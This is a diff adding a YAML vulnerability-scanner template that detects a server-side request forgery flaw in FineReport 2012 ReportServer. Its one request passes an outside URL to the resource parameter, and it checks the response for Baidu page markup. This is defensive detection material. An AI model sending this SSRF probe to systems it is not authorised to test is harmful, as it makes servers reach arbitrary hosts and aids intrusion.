@@ -1,0 +1,24 @@
+id: poc-yaml-findreport-2012-reportsever-ssrf
+info:
+  name: FineReport 2012 ReportServer SSRF Vulnerability
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: ssrf
+  description: |
+    This template detects a server-side request forgery (SSRF) vulnerability in FineReport 2012 ReportServer.
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/ReportServer?op=resource&resource=http://www.baidu.com"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<img hidefocus=true src=//www.baidu.com/img/bd_logo1.png width=270 height=129>"
+          - "<a href=http://ir.baidu.com>About Baidu</a>"
+          - "<img src=//www.baidu.com/img/gs.gif>"
